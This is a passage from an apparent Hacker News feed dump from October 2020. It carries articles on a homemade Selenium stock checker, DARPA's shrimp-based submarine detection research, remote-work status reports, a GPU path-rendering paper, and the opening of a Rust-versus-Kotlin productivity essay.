            <pubDate>Thu, 29 Oct 2020 22:44:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Run your own free Stock Checker]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24936750">thread link</a>) | @gunnr15
<br/>
October 29, 2020 | https://jaydlawrence.dev/check-if-items-are-in-stock-online-for-free/ | <a href="https://web.archive.org/web/*/https://jaydlawrence.dev/check-if-items-are-in-stock-online-for-free/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <h2 id="the-problem">The Problem</h2><p>While looking for parts for a PC online during the Nvidia RTX 3080 drought of late 2020, I really wanted a way to automate checking various websites to see if there were any RTX 3080s in stock / available to purchase.</p><h2 id="out-of-the-box-solutions">Out of the box solutions</h2><p>There are some solutions that exist online that use browser plugins or will do the checking for you on their servers.</p><p>If they have a free solution, it is usually very limited, like <a href="https://distill.io/">distill.io</a> which allows only 30 notifications emails each month. I tried using them but I burnt through the 30 emails pretty quickly with 30 false positives in a couple of days.</p><h2 id="my-solution">My Solution</h2><p>I decided to build my own solution using <a href="https://nodejs.org/">NodeJs</a> and <a href="https://www.selenium.dev/documentation/en/webdriver/">Selenium webdriver</a>.</p><p>Selenium webdriver uses your local browser to visit the various sites and has tools to pull data from the pages it visits.</p><p>With that in mind, I created a package to visit predefined sites, retrieve text from a specified element and compare it to a specified value.</p><p>When there is a difference, it can notify you via <a href="https://pushover.net/">Pushover</a> or <a href="https://mail.google.com/">Gmail</a>, or both.</p><p>My package is available on <a href="https://github.com/jaydlawrence/stock-checker/">GitHub</a>.</p><figure><a href="https://github.com/jaydlawrence/stock-checker"><div><p>jaydlawrence/stock-checker</p><p>Contribute to jaydlawrence/stock-checker development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://avatars3.githubusercontent.com/u/1242060?s=400&amp;v=4"></p></a></figure><h2 id="running-it-yourself">Running it yourself</h2><p>If you would like to use the package yourself, the instructions are available in the README.md of the project.</p><p>If you are not familiar with GitHub or NodeJs apps, here is a quick summary of the extra steps:</p><h3 id="download-the-project-from-github-">Download the project from GitHub.</h3><p>It should be available as a zip archive, download that and extract it.</p><figure><img src="https://jaydlawrence.dev/content/images/2020/10/Screen-Shot-2020-10-22-at-4.44.14-PM.png"></figure><h3 id="install-nodejs">Install NodeJs</h3><p>Installing NodeJs will differ depending on your operating system.</p><p>Check their website for more details. </p><p><a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></p><h3 id="use-npm-to-install-the-dependencies">Use NPM to install the dependencies</h3><p>When node is installed you will have access to the package manager that comes with it, called NPM.</p><p>Use whichever shell or command prompt you have access to, to navigate to the project directory and then install with:</p><!--kg-card-begin: markdown--><pre><code>npm install
</code></pre>
<!--kg-card-end: markdown--><h3 id="follow-the-readme-md-instructions">Follow the README.md instructions</h3><p>From here, you should be able to follow the instructions in the project documentation.</p><h3 id="getting-the-xpaths-that-you-need">Getting the XPaths that you need</h3><p>In Google Chrome, there is a built in tool to get the XPath from a particular element.</p><p>Start by right-clicking on the element you want to monitor and select, inspect.</p><figure><img src="https://jaydlawrence.dev/content/images/2020/10/Screen-Shot-2020-10-22-at-4.57.20-PM.png"><figcaption>Inspect Element with Chrome</figcaption></figure><p>Then it reveals the HTML code for the element. Right click on this element and select copy and then Copy XPath.</p><figure><img src="https://jaydlawrence.dev/content/images/2020/10/Screen-Shot-2020-10-22-at-4.58.16-PM.png"></figure><p>You can then paste this in the config.</p><!--kg-card-begin: markdown--><pre><code>  {
    "url": "https://www.newegg.ca/asus-geforce-rtx-3080-rog-strix-rtx3080-o10g-gaming/p/N82E16814126457",
    "xPath": "//*[@id=\"app\"]/div[2]/div[1]/div/div/div[1]/div[1]/div[1]",
    "expected": "OUT OF STOCK",
    "description": "New Egg - ASUS RTX3080 Strix"
  },
</code></pre>
<!--kg-card-end: markdown--><p>You will have to escape any quotation marks in the XPath.</p><!--kg-card-begin: markdown--><p>So if there is a <code>"</code> in the middle of the XPath, replace it with <code>\"</code>.</p>
<!--kg-card-end: markdown--><p>If you want to double check the XPath and the text value that it gets, you can use the Chrome extension called <a href="https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl">XPath Helper</a>.</p><figure><a href="https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl"><div><p>XPath Helper</p><p>Extract, edit, and evaluate XPath queries with ease.</p><p><img src="https://ssl.gstatic.com/chrome/webstore/images/icon_144px.png"><span>‚Äèÿ≥ŸàŸÇ Chrome ÿßŸÑÿ•ŸÑŸÉÿ™ÿ±ŸàŸÜŸä</span></p></div><p><img src="https://lh3.googleusercontent.com/iFXsBT4tpTPho9MSuLb1Rr_83KjP5bLOQLVpIyCPG3UoTXZIocYKw-82cQBIenRz5u8sJeIekg=w128-h128-e365-rj-sc0x00ffffff"></p></a></figure><p>If you open the extension on your target page and paste your XPath in and it will show what text it finds.</p><figure><img src="https://jaydlawrence.dev/content/images/2020/10/image.png"></figure><h2 id="tips-for-setting-the-cron">Tips for setting the Cron</h2><p>Wikipedia has a good overview of what the Unix Cron is and how it works.</p><p><a href="https://en.wikipedia.org/wiki/Cron">https://en.wikipedia.org/wiki/Cron</a></p><p>When setting the cron to run your search, keep in mind that some websites will block your computer if you hit them too often.</p><p>I have found that setting it to 5 minutes works well for me.</p><!--kg-card-begin: markdown--><pre><code>*/5 * * * * /path_to_script/stock-checker/run.sh
</code></pre>
<!--kg-card-end: markdown-->
                </div>
            </section></div>]]>
            </description>
            <link>https://jaydlawrence.dev/check-if-items-are-in-stock-online-for-free/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24936750</guid>
            <pubDate>Thu, 29 Oct 2020 22:15:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DARPA‚Äôs new sub hunting weapon is shrimp]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24936736">thread link</a>) | @Gaishan
<br/>
October 29, 2020 | https://www.sandboxx.us/blog/darpas-newest-sub-hunting-weapon-is-shrimp/ | <a href="https://web.archive.org/web/*/https://www.sandboxx.us/blog/darpas-newest-sub-hunting-weapon-is-shrimp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>DARPA‚Äôs effort to track undersea life‚Äôs behavior as a means to detect enemy submarines has just entered its second phase. In the first phase, DARPA‚Äôs Persistent Aquatic Living Sensors (PALS) program sought to prove that sea life would respond to the presence of a submarine in a measurable way. With that seemingly confirmed, the second stage of the program will focus on developing sensors that can identify that behavior and relay a warning back to manned locations aboard a ship or onshore.</p><p>While the science is complex, the premise behind the PALS program is fairly simple. Undersea life tends to behave in a certain way when it senses the presence of a large and foreign object like a submarine. By broadly tracking the behavior of sea life, PALS aims to measure and interpret that behavior to make educated guesses about what must be causing it. In other words, by constantly tracking the behavior of nearby wildlife, PALS sensors can notice a significant change, compare it to a library of known behaviors, and predict a cause‚Ä¶ like an enemy submarine, even if a submarine was stealthy enough to otherwise evade detection.</p><div><figure><picture>
<source type="image/webp" data-lazy-srcset="https://www.sandboxx.us/wp-content/uploads/2020/10/PALSConceptFinal.jpg.webp 800w, https://www.sandboxx.us/wp-content/uploads/2020/10/PALSConceptFinal-300x134.jpg.webp 300w, https://www.sandboxx.us/wp-content/uploads/2020/10/PALSConceptFinal-768x342.jpg.webp 768w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 800px) 100vw, 800px">
<img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="darpa" data-lazy-srcset="https://www.sandboxx.us/wp-content/uploads/2020/10/PALSConceptFinal.jpg 800w, https://www.sandboxx.us/wp-content/uploads/2020/10/PALSConceptFinal-300x134.jpg 300w, https://www.sandboxx.us/wp-content/uploads/2020/10/PALSConceptFinal-768x342.jpg 768w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://www.sandboxx.us/wp-content/uploads/2020/10/PALSConceptFinal.jpg">
</picture>
<figcaption>Artist‚Äôs rendering of DARPA‚Äôs PALS Program. (DARPA)</figcaption></figure></div><p>With enough data about how animals react to the presence of an enemy vessel as compared to how animals react to the presence of a large predator or more common undersea threat, PALS could serve as an early warning system when enemy subs approach.</p><blockquote><p>‚ÄúBecause marine organisms are ubiquitous in their environments, self-replicating, and largely self-sustaining, sensing systems that use marine organisms as their foundation would be discreet, cost-effective, and provide persistent undersea surveillance with a minimal logistical footprint.‚Äù</p><cite>‚Äì<em>Dr. Lori Adornato, PALS program manager</em></cite></blockquote><p>Encroaching enemy submarines are extremely difficult to detect, even with modern surveillance technology. The ocean is vast, and even America‚Äôs massive Navy can‚Äôt hope to police all of it. The U.S. Navy is currently developing crewless surface ships in a variety of forms, including the ACTUV Sea Hunter that will eventually be tasked with hunting submarines in its own right ‚Äî but even with a fleet of drone ships, the Navy will still need highly effective underwater sensors to catch the attention of these vessels. DARPA‚Äôs PALS program would theoretically leverage existing wildlife to that end.</p><div><figure><picture>
<source type="image/webp" data-lazy-srcset="https://www.sandboxx.us/wp-content/uploads/2020/10/25702146834_c23aa793ab_b-1.jpg.webp 1024w, https://www.sandboxx.us/wp-content/uploads/2020/10/25702146834_c23aa793ab_b-1-300x200.jpg.webp 300w, https://www.sandboxx.us/wp-content/uploads/2020/10/25702146834_c23aa793ab_b-1-768x512.jpg.webp 768w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px">
<img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="darpa" data-lazy-srcset="https://www.sandboxx.us/wp-content/uploads/2020/10/25702146834_c23aa793ab_b-1.jpg 1024w, https://www.sandboxx.us/wp-content/uploads/2020/10/25702146834_c23aa793ab_b-1-300x200.jpg 300w, https://www.sandboxx.us/wp-content/uploads/2020/10/25702146834_c23aa793ab_b-1-768x512.jpg 768w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://www.sandboxx.us/wp-content/uploads/2020/10/25702146834_c23aa793ab_b-1.jpg">
</picture>
<figcaption>The Sea Hunter program is another sub-hunting initiative originally championed by DARPA. (DoD image)</figcaption></figure></div><blockquote><p>‚ÄúRaytheon BBN is working with snapping shrimp for use in a passive bi-static sonar system; Northrop Grumman Systems Corporation is also working with snapping shrimp, using the snap as the input pulse for a 3D acoustic imaging system; and a third team from Florida Atlantic University uses Goliath Grouper as their biological sensor.‚Äù</p><p>‚ÄúNaval Undersea Warfare Center ‚Äì Newport Division is a government partner on the program, using an ecosystem approach to determine if an unmanned underwater vehicle has passed by a reef.‚Äù</p><cite>-DARPA Press Release</cite></blockquote><p>The need for a reliable means of submarine detection has grown in importance in recent years, as Russia diverts military funding toward its submersible fleet, and China continues production of subs like the Jin-class Type 094. With China‚Äôs rapidly growing Navy posing a threat to American interests in the Pacific and Russia‚Äôs sub fleet operating in the Atlantic, the United States has a greater need for a reliable means of submarine detection than it has at any point since the Cold War.</p><p>The Pentagon <a href="https://www.sandboxx.us/blog/dod-map-shows-russian-and-chinese-subs-are-too-close-for-comfort/">recently released</a> a map showing the travel paths of Russian and Chinese naval vessels, alongside important undersea cables, as a part of its 2021 National Defense Authorization Act request, commonly referred to as the DoD‚Äôs budget. The map clearly shows the heavy traffic in both The Atlantic and Pacific oceans, with Russian subs encroaching on America‚Äôs eastern seaboard and Chinese submarines creeping up in the west.</p><figure><picture>
<source type="image/webp" data-lazy-srcset="https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1-1128x750.jpg.webp 1128w, https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1-300x199.jpg.webp 300w, https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1-768x511.jpg.webp 768w, https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1.jpg.webp 1536w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 1128px) 100vw, 1128px">
<img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-srcset="https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1-1128x750.jpg 1128w, https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1-300x199.jpg 300w, https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1-768x511.jpg 768w, https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1.jpg 1536w" data-lazy-sizes="(max-width: 1128px) 100vw, 1128px" data-lazy-src="https://www.sandboxx.us/wp-content/uploads/2020/10/map-1536x1021-1-1128x750.jpg">
</picture>
<figcaption>(Courtesy of the Dept. of Defense)</figcaption></figure><blockquote><p>‚ÄúOur new reality is that when our sailors toss the lines over and set sail, they can expect to be operating in a contested space once they leave Norfolk,‚Äù&nbsp;U.S. Navy Vice Admiral Andrew ‚ÄúWoody‚Äù Lewis said earlier this year.</p><p>‚ÄúOur ships can no longer expect to operate in a safe haven on the East Coast or merely cross the Atlantic unhindered to operate in another location.</p></blockquote><p>The threat posed by Russia‚Äôs submarines, in particular, seems to have prompted the U.S. Navy to re-establish its Second Fleet tasked with Atlantic defense. In March of 2018, Russian officials announced that they had successfully sent a fleet of nuclear attack submarines to America‚Äôs Eastern Seaboard. According to their claims, several submarines took up positions 12 miles off the coast of American military installations, remained there undetected, and then sailed back home.</p><blockquote><p>‚ÄúThis mission has been accomplished, the submarines showed up in the set location in the ocean and returned to base,‚Äù the commander of the submarine squadron, Sergey Starshinov, was&nbsp;<a href="https://www.rt.com/news/421471-russian-nuclear-subs-us-drills/">quoted</a>&nbsp;as saying at the time.</p></blockquote><p>The United States did not formally respond to these claims, and with good reason. If the United States were to refute Russia‚Äôs submarine-based boasting, Russia could easily claim that the U.S.‚Äô submarine defenses are simply too ineffective to spot them as they approach. If the U.S. instead announced that they were aware of the submarines and tracked them throughout, it would prompt the Russian Navy to find ways to circumvent the form of detection America did leverage. Instead, in what seemed to be a direct response to Russia‚Äôs claims, the U.S. Navy brought the Second Fleet out of proverbial mothballs and tasked it with policing the very body of water Russia claimed to dominate with its nuclear submarines.</p><p><em>Combined feature images courtesy of WikiMedia Commons</em></p></div><div><div><div> <picture>
<source type="image/webp" data-lazy-srcset="https://www.sandboxx.us/wp-content/uploads/2020/03/86346554_10157610801926084_4479145792984055808_n.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E">
<img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.sandboxx.us/wp-content/uploads/2020/03/86346554_10157610801926084_4479145792984055808_n.jpg">
</picture>
</div><div><h3>Alex Hollings</h3><p>Alex Hollings is a writer, dad, and Marine veteran who specializes in foreign policy and defense technology analysis. He holds a master‚Äôs degree in Communications from Southern New Hampshire University, as well as a bachelor‚Äôs degree in Corporate and Organizational Communications from Framingham State University.</p></div></div></div></div>]]>
            </description>
            <link>https://www.sandboxx.us/blog/darpas-newest-sub-hunting-weapon-is-shrimp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24936736</guid>
            <pubDate>Thu, 29 Oct 2020 22:14:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Flutter Multi-Platform Ecosystem with Chris Sells]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24936522">thread link</a>) | @daliso
<br/>
October 29, 2020 | https://www.dartdevshow.com/episodes/the-flutter-multi-platform-ecosystem-with-chris-sells | <a href="https://web.archive.org/web/*/https://www.dartdevshow.com/episodes/the-flutter-multi-platform-ecosystem-with-chris-sells">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.dartdevshow.com/episodes/the-flutter-multi-platform-ecosystem-with-chris-sells</link>
            <guid isPermaLink="false">hacker-news-small-sites-24936522</guid>
            <pubDate>Thu, 29 Oct 2020 21:53:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Use Status Reports Effectively in Remote Work Environment?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24936129">thread link</a>) | @markshepard
<br/>
October 29, 2020 | https://www.airsend.io/blog/index.php/2020/09/28/how-to-use-status-reports-in-remote-work-communication/ | <a href="https://web.archive.org/web/*/https://www.airsend.io/blog/index.php/2020/09/28/how-to-use-status-reports-in-remote-work-communication/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2512">
	

	




	<div>
		
<div><figure><img src="https://www.airsend.io/blog/wp-content/uploads/2020/09/wechat-1-1024x576.png" alt="" width="732" height="411" srcset="https://www.airsend.io/blog/wp-content/uploads/2020/09/wechat-1-1024x576.png 1024w, https://www.airsend.io/blog/wp-content/uploads/2020/09/wechat-1-300x169.png 300w, https://www.airsend.io/blog/wp-content/uploads/2020/09/wechat-1-768x432.png 768w, https://www.airsend.io/blog/wp-content/uploads/2020/09/wechat-1-1536x864.png 1536w, https://www.airsend.io/blog/wp-content/uploads/2020/09/wechat-1-2048x1152.png 2048w" sizes="(max-width: 732px) 100vw, 732px"></figure></div>



<p>In our <a href="https://www.airsend.io/blog/index.php/2020/09/07/a-complete-guide-to-digital-communication-for-remote-teams-part-1/">guide on remote work communication</a>, we mentioned the importance of status reports to keep everyone on the same page.  Here is an expansion of that. In this blog post, we‚Äôre going to talk about the importance of status reports in remote work, how to implement status reports, some tips on making status reports work for you, and how we do our status reports using AirSend.</p>



<h2>Why Status Reports Are Important</h2>



<p>In short, status reports keeps everyone in sync with each other and help keep you on track, both of which are increasingly important in a remote work setting.</p>



<p>As a team crosses a certain number of people it becomes harder to keep all people, groups, and teams in sync with each other. People working in one area or function  might not be aware that it might impact or affect other areas inadvertently or there are other unknown ramifications of the work they are doing.</p>



<p>Distributing that information across everyone becomes challenging. Using Team meetings etc. to communicate statuses become ineffective as it either takes too long or wastes time. </p>



<p>Status reports increase the visibility of the work you are doing and raise the overall profile and awareness of initiatives and new projects across the whole team. Also, status reports are a work journal for yourself and help you focus on what needs to be done every week and brings clarity and purpose.</p>



<h2>How to Implement Status Reports</h2>



<p>Like most things, consistency is key in successful implementation of status reports. Here are some guidelines to follow:</p>



<ul><li>Have everyone on the team add their weekly status report to a set location. We use an AirSend Channel to collect ours.</li><li>Make sure everyone sends status reports weekly (ideally at end of the day on Friday) to wrap up your week.</li><li>For easy filtering, everyone should use the same subject keywords. For example, ‚Äò<strong>status report w/e 7/14/2017</strong>‚Äò (‚Äòstatus report‚Äô is the keyword, w/e just says week ending and the week).</li><li>Make sure everyone knows what to put in their reports, which brings us to:</li></ul>



<h2>What Status Reports Should Communicate</h2>



<p>Status reports should communicate a few essential things:</p>



<ul><li>What you got done last week (Be as specific as you can, details are ok)</li><li>What problems or challenges you overcame, and what problems you still face and are working on</li><li>What you plan to accomplish or work on next week</li><li>Any other information worth sharing (upcoming time off, achievements outside work, etc)</li></ul>



<h2>Additional Status Report Pointers</h2>



<ul><li>Everyone needs to send out status reports</li><li>Status reports are meant to communicate first, so make it readable and useful</li><li>Sometimes, the simplest way is to keep adding notes on work done in the week and send it out at the end of the week. It becomes hard to remember all the things that were done at the end of the week.</li><li>Sometimes, for certain work, it might be hard to write reports (for example for tech support which deals with 100s of emails in a week). In those cases, pick a sample of the most important or interesting problems that you worked on during the week.&nbsp;</li><li>Make the next week section a realistic plan of action for yourself. Please don‚Äôt dump your entire sprint action list there unless you really plan to complete it by then.</li><li>Status reports are the #1 way to communicate the work you are doing and the progress you are making, so make sure to showcase the achievements and the tough problems you tracked and solved. This will include customer support sessions for specific problems and what happened there.</li><li>If you learned something new this week please share that.</li><li>If you are undergoing training, please share your training guide and the progress you made there.</li><li>If you took courses outside, please share that.</li><li>A status report is a communication and a showcase about you to the entire team, so take some pride in how it is crafted and how it is sent.&nbsp;</li></ul>



<h2>Status Reports in AirSend</h2>



<p>As mentioned before, we use a Weekly Status Reports Channel in AirSend to share our weekly status reports. This works well for us because it‚Äôs easy to format messages using Markdown and share images and other files in AirSend. Below are some actual screenshots of our status report Channel.</p>



<h3>Messages and Attachments</h3>



<figure><img src="https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Messages-and-Images-01-1-1024x573.png" alt="" srcset="https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Messages-and-Images-01-1-1024x573.png 1024w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Messages-and-Images-01-1-300x168.png 300w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Messages-and-Images-01-1-768x430.png 768w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Messages-and-Images-01-1-1536x860.png 1536w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Messages-and-Images-01-1-2048x1146.png 2048w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></figure>



<h3>Important Information in the Wiki</h3>



<figure><img src="https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Wiki-01-1-1024x575.png" alt="" srcset="https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Wiki-01-1-1024x575.png 1024w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Wiki-01-1-300x169.png 300w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Wiki-01-1-768x431.png 768w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Wiki-01-1-1536x863.png 1536w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Wiki-01-1-2048x1150.png 2048w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></figure>



<h3>Task Tracking in Actions</h3>



<figure><img src="https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Actions-01-1-1024x575.png" alt="" srcset="https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Actions-01-1-1024x575.png 1024w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Actions-01-1-300x168.png 300w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Actions-01-1-768x431.png 768w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Actions-01-1-1536x863.png 1536w, https://www.airsend.io/blog/wp-content/uploads/2020/09/Status-Actions-01-1-2048x1150.png 2048w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></figure>



<p>We hope this was useful to you! </p>



<p>Until next time,</p>



<p>The AirSend Team</p>
	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://www.airsend.io/blog/index.php/2020/09/28/how-to-use-status-reports-in-remote-work-communication/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24936129</guid>
            <pubDate>Thu, 29 Oct 2020 21:26:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Efficient GPU Path Rendering Using Scanline Rasterization]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24935685">thread link</a>) | @vg_head
<br/>
October 29, 2020 | http://kunzhou.net/zjugaps/pathrendering/ | <a href="https://web.archive.org/web/*/http://kunzhou.net/zjugaps/pathrendering/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<h2>Abstract</h2>
<p>
We introduce a novel GPU path rendering method based on scanline rasterization, which is highly work-efficient but traditionally considered as GPU hostile. Our method is parallelized over boundary fragments, i.e., pixels directly intersecting the path boundary. Non-boundary pixels are processed in bulk as horizontal spans like in CPU scanline rasterizers, which saves a significant amount of winding number computation workload. The distinction also allows the majority of our algorithm steps to focus on boundary fragments only, which leads to highly balanced workload among the GPU threads. In addition, we develop a ray shooting pattern that minimizes the global data dependency when computing winding numbers at anti-aliasing samples. This allows us to shift the majority of winding-number-related workload to the same kernel that consumes its result, which saves a significant amount of GPU memory bandwidth. Experiments show that our method gives a consistent 2.5√ó speedup over state-of-the-art alternatives for high-quality rendering at Ultra HD resolution, which can increase to more than 30√ó in extreme cases. We can also get a consistent 10√ó speedup on animated input.
</p>
<p><img src="http://kunzhou.net/zjugaps/pathrendering/gpu-scanline.png" width="1000" alt="" title=""> <br>
</p></div> <!-- span10 -->

</div><div>
<div>
<h2>BibTeX</h2>
<pre>@article {GPUpathtracingSA16,
title = {Efficient GPU Path Rendering Using Scanline Rasterization},
author = {Rui Li and Qiming Hou and Kun Zhou}
journal = {ACM Transactions on Graphics},
volume = {35},
number = {6},
pages = {},
year = {2016}
}
</pre>
</div>



</div></div>]]>
            </description>
            <link>http://kunzhou.net/zjugaps/pathrendering/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24935685</guid>
            <pubDate>Thu, 29 Oct 2020 20:52:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For Complex Applications, Rust Is as Productive as Kotlin]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24935355">thread link</a>) | @dochtman
<br/>
October 29, 2020 | https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="preamble">
<div>
<p>In this article, we will compare one apple (IntelliJ Rust) to one orange (rust-analyzer) to reach general and sweeping conclusions.
Specifically, I want to present a case study supporting the following claim:</p>
<p>For complex applications, Rust is as productive as Kotlin.</p>
<p>For me, this is an unusual claim to argue: I always thought exactly the opposite, but I am not so sure now.
I came to Rust from C++.
I was of the opinion that this is a brilliant low-level language and always felt puzzled at people writing higher-level things in Rust.
Clearly, choosing Rust means taking a productivity hit, and using Kotlin, C# or Go just makes much more sense if you can afford GC.
My <a href="https://matklad.github.io/2020/09/20/why-not-rust.html">list of Rust criticisms</a> starts with this objection.</p>
<p>What moved my position in the other direction was my experience as the lead developer of rust-analyzer and IntelliJ Rust.
Let me introduce the two projects.</p>
<p><a href="https://github.com/intellij-rust/intellij-rust"><strong>IntelliJ Rust</strong></a> is the plugin for IntelliJ Platform, providing Rust support.
In effect, it is a Rust compiler front-end, written in Kotlin and making use of language-support features of the platform.
These features include lossless syntax trees, a parser generator, persistence and indexing infrastructure, among others.
Nonetheless, as programming languages differ lot, the bulk of logic for analyzing Rust is implemented in the plugin itself.
Presentational features like completion list come from the platform, but most of the language semantics is hand-written.
IntelliJ Rust also includes a bit of a Swing GUI.</p>
<p><a href="https://github.com/rust-analyzer/rust-analyzer"><strong>rust-analyzer</strong></a> is an implementation of
<a href="https://microsoft.github.io/language-server-protocol/">Language Server Protocol</a> for Rust.
It is a Rust compiler front-end written from scratch with an eye towards IDE support.
It makes heavy use of <a href="https://github.com/salsa-rs/salsa">salsa</a> library for incremental computations.
Beyond the compiler itself, rust-analyzer includes code for managing long-lived multithreaded process of the language server itself.</p>
<p>The projects are essentially equivalent in scope‚Äâ‚Äî‚Äârust compiler front-ends suitable for IDEs.
The two biggest differences are:</p>
<div>
<ul>
<li>
<p>IntelliJ Rust is a plugin, so it can re-use code and design patterns of the surrounding platform.</p>
</li>
<li>
<p>rust-analyzer is the second system, so it leverages experience of IntelliJ Rust for a from-scratch design.</p>
</li>
</ul>
</div>
<p>The internal architecture of the two projects also differs a lot.
In terms of <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">Three Architectures</a>, IntelliJ Rust is map-reduce, and rust-analyzer is query-based.</p>
<p>Writing an IDE-ready compiler is a high-level task.
You don‚Äôt need to talk to the operating system directly.
There are some fancy data structures and concurrency here and there, but they are also high-level.
It‚Äôs not about implementing crazy lock-free schemes, it‚Äôs about maintaining application state and sanity in the multithreaded world.
The bulk of the compiler is symbolic manipulation, arguably best suited for lisp.
Picking a VM-based language for such task (for example, OCaml), doesn‚Äôt have any intrinsic downsides.</p>
<p>At the same time, the task is pretty complex and unique.
The ratio of ‚Äúyour code‚Äù vs ‚Äúframework code‚Äù when implementing features is much higher than in a typical CRUD backend.</p>
<p>Now that the projects are introduced, lets take two roughly equivalent slices of history.</p>

<p>Both are about 2 years old, with 1-1.5 developers working full time and vibrant and thriving community of open-source contributors.
There are 52k lines of Kotlin and 66k lines of Rust.</p>
<p>Both delivered roughly equivalent feature sets at that time.
To be honest, I still don‚Äôt really believe this :)
rust-analyzer started from zero, it didn‚Äôt have a decade worth of Java classes to bootstrap from, and the productivity drop between Kotlin and Rust is supposed to be huge.
But it‚Äôs hard to argue with reality.
Instead, let me try to reflect on my experience building both, and to try to explain Rust‚Äôs surprising productivity.</p>
</div>
</div>
<div>
<h2 id="_learning_curve">Learning Curve</h2>
<div>
<p>It‚Äôs easy to characterize Kotlin‚Äôs learning curve‚Äâ‚Äî‚Äâit is nearly zero.
